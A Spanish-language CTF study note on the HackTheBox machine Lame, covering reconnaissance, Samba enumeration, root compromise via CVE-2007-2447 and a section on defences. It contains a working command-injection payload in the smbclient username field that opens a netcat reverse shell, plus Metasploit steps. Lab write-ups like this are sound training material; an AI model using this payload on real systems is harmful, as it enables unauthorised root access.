---
title: Lame (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, samba, rce, cve-2007-2447, linux, easy]
type: nota
status: en-progreso
source: claude-code
aliases: [Lame HTB, HTB Lame, lame hackthebox]
---

# Lame — HackTheBox (Easy)

SO: Linux · Dificultad: Easy · Skills: Nmap, enumeracion Samba, RCE via username map script (CVE-2007-2447), Metasploit / explotacion manual con smbclient

La primera maquina publica de Hack The Box. Sirve de introduccion a la metodologia basica: reconocimiento, identificacion de servicio vulnerable con CVE conocido, y explotacion directa. El foothold da acceso como `root` sin escalada adicional, lo que la hace ideal para interiorizar el flujo antes de maquinas mas complejas.

> HTB es un laboratorio de hacking autorizado y legal. Todas las tecnicas descritas aqui aplican exclusivamente en entornos de practica o con permiso explicito del propietario.

---

## Objetivo

Obtener acceso remoto a la maquina y leer `user.txt` (home del usuario makis) y `root.txt` (`/root/root.txt`).

---

## Acceso a la maquina (paso previo)

1. Descarga tu perfil VPN desde HTB (`.ovpn`) y conectate:
```bash
sudo openvpn lab_<usuario>.ovpn
```
Deja esta terminal abierta; la conexion debe mantenerse activa.

2. En la web de HTB, ve a la maquina Lame y pulsa **Spawn Machine**. Recibes una IP del rango `10.10.10.x` (dinamica, en las maquinas retiradas suele ser `10.10.10.3`).

3. Comprueba conectividad:
```bash
ping -c2 <IP>
```

4. Sustituye `<IP>` por la IP real que te haya asignado HTB en todos los comandos siguientes.

> Nota: Lame es una maquina retirada — requiere suscripcion VIP para jugarla en solitario. Las maquinas activas son gratuitas. El Pwnbox (Kali en el navegador de HTB) ya viene preconectado a la VPN.

---

## Reconocimiento

**Categoria: escaneo de puertos y deteccion de versiones.**

El primer paso es siempre determinar que servicios estan expuestos y con que versiones. Nmap hace ambas cosas en un solo pase:

```bash
nmap -sV -sC -oN lame_nmap.txt <IP>
```

Resultado relevante (resumido):

| Puerto | Servicio | Version |
|--------|----------|---------|
| 21/tcp  | FTP      | vsftpd 2.3.4 |
| 22/tcp  | SSH      | OpenSSH 4.7p1 |
| 139/tcp | SMB      | Samba smbd 3.X |
| 445/tcp | SMB      | Samba smbd 3.0.20 |

Dos datos clave de inmediato:
- **vsftpd 2.3.4** — version notoriamente backdooreada (CVE-2011-2523). Sin embargo, en Lame ese backdoor no esta activo o no es la via principal; se menciona para que sepas descartarla.
- **Samba 3.0.20** — version con CVE-2007-2447. Esta es la via de ataque.

---

## Enumeracion

**Categoria: enumeracion de SMB y verificacion de version exacta.**

Confirma la version de Samba con `smbclient` o con el script de Nmap `smb-vuln-*`:

```bash
smbclient -L //<IP>/ -N
```

Tambien puedes usar `enum4linux` para enumerar recursos compartidos, usuarios y politicas:

```bash
enum4linux -a <IP>
```

Lo importante es confirmar que Samba es 3.0.20 (o en el rango 3.0.x antes del parche). Con eso, buscas el CVE:

```bash
searchsploit samba 3.0.20
```

`searchsploit` devuelve `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution (Metasploit)`. Identificador: **CVE-2007-2447**.

---

## Acceso inicial (foothold)

**Categoria: RCE pre-autenticado via inyeccion de comandos en campo de usuario SMB (CVE-2007-2447).**

### Que hace la vulnerabilidad

Samba 3.0.20 pasa el nombre de usuario directamente a `/bin/sh` cuando la opcion `username map script` esta habilitada en `smb.conf`. Si el nombre de usuario contiene backticks o `$()`, el shell los interpreta y ejecuta el codigo embebido **como el proceso de Samba**, que en este servidor corre como `root`. No se necesita autenticacion valida.

### Via A — Metasploit (estandar)

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
set LHOST <tu-IP-de-tun0>   # tu IP en la interfaz VPN
set LPORT 4444
run
```

El modulo construye automaticamente el payload en el campo de usuario, abre una sesion `cmd/unix` o Meterpreter y devuelve una shell como `root`.

### Via B — Manual con smbclient (sin Metasploit)

Primero levanta un listener en tu maquina:

```bash
nc -lvnp 4444
```

Luego conecate a Samba poniendo el payload en el campo de usuario. El truco es usar la sintaxis `/=\`...\`` que Samba evalua como subshell:

```bash
smbclient //<IP>/tmp \
  -U '/=`nohup nc -e /bin/sh <tu-IP-tun0> 4444`' \
  --no-pass
```

> Ajusta el path del recurso compartido si `tmp` no esta disponible; `enum4linux` te lista los shares. El comando exacto puede variar segun version de smbclient instalada — lo importante es que el nombre de usuario contenga el payload entre backticks precedido de `/=`.

Cuando la conexion llega al listener, obtienes una shell interactiva. Verifica con:

```bash
id
# uid=0(root) gid=0(root)
```

**No hay escalada de privilegios.** Samba corria como root, por lo que el foothold ya es root.

---

## Escalada de privilegios

No aplica en esta maquina. El servicio Samba corria con privilegios de `root`, de modo que la ejecucion de comandos via CVE-2007-2447 ya entrega una shell root directamente.

Este es un patron importante para tu modelo mental: **la criticidad de un RCE depende del usuario con el que corre el proceso vulnerable**, no solo de que haya RCE.

---

## Flags

Desde la shell root, las flags estan accesibles sin restricciones:

```bash
cat /home/makis/user.txt    # user.txt: <flag>
cat /root/root.txt          # root.txt: <flag>
```

---

## Patron y teoria

Esta es la seccion mas importante: no el "como", sino el "por que" y "como evitarlo".

### Patron general

```
Servicio de red desactualizado
  → Version con CVE publico y exploit maduro
    → Proceso corre con privilegios elevados (root)
      → RCE directo como root
        → Maquina comprometida en un solo paso
```

Este es uno de los patrones mas frecuentes en entornos reales legacy: un servicio que nadie actualiza porque "funciona", expuesto directamente, corriendo con el usuario mas privilegiado posible.

### Detalle tecnico del patron CVE-2007-2447

La vulnerabilidad es de tipo **OS Command Injection** pre-autenticada. No explota un desbordamiento de buffer ni una corrupcion de memoria — simplemente confia en la entrada del usuario y la pasa a un shell sin sanear. Esta clase de error (interpolar datos externos en llamadas a sistema sin escapar) aparece constantemente en distintas formas: shell injection, SQL injection, LDAP injection... el mecanismo subyacente es el mismo.

### Como se defiende / como se disena para evitarlo

1. **Parchea y actualiza.** Samba 3.0.25rc3 corrige este CVE. Mantener un inventario de versiones (SBOM) y alertas de CVE por componente es la primera linea de defensa.

2. **Principio de minimo privilegio.** Samba no necesita correr como `root`. Ejecutar servicios con un usuario dedicado sin privilegios (p.ej. `samba` o `nobody`) limita el radio de impacto: incluso con RCE, el atacante obtiene una shell sin privilegios y necesita una vulnerabilidad adicional para escalar.

3. **Segmentacion de red.** SMB (puertos 139/445) no deberia estar expuesto a internet ni a redes no confiables. Un firewall perimetral o grupos de seguridad que restrinjan el acceso a SMB solo desde redes internas habria impedido el ataque desde el exterior.

4. **Nunca confies en datos del usuario en llamadas al sistema.** A nivel de codigo: si necesitas ejecutar comandos del sistema, usa APIs de la libreria que no invoquen un shell interprete (p.ej. `execve` con lista de argumentos en C, `subprocess` con lista en Python). Nunca construyas strings que se pasen a `system()` o `popen()` con datos externos sin sanitizar.

5. **Monitoriza versiones con herramientas automaticas.** `searchsploit`, bases de datos NVD, o herramientas como Trivy/Grype en CI/CD pueden alertar de CVEs criticos antes de que llegue el atacante.

### El salto respecto a Starting Point

En Starting Point los servicios vulnerables suelen requerir credenciales por defecto o configuraciones triviales. En Lame el salto esta en que es un **CVE real de RCE pre-autenticado** con exploit publico maduro. La cadena es mas corta (foothold = root), pero el concepto mas profundo: identificar version → buscar CVE → entender que hace el exploit → ejecutarlo. Las maquinas siguientes añadiran un paso mas: foothold como usuario sin privilegios → escalada separada.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[08-vulnerabilidades-y-explotacion]]
- [[13-herramientas-en-detalle]]
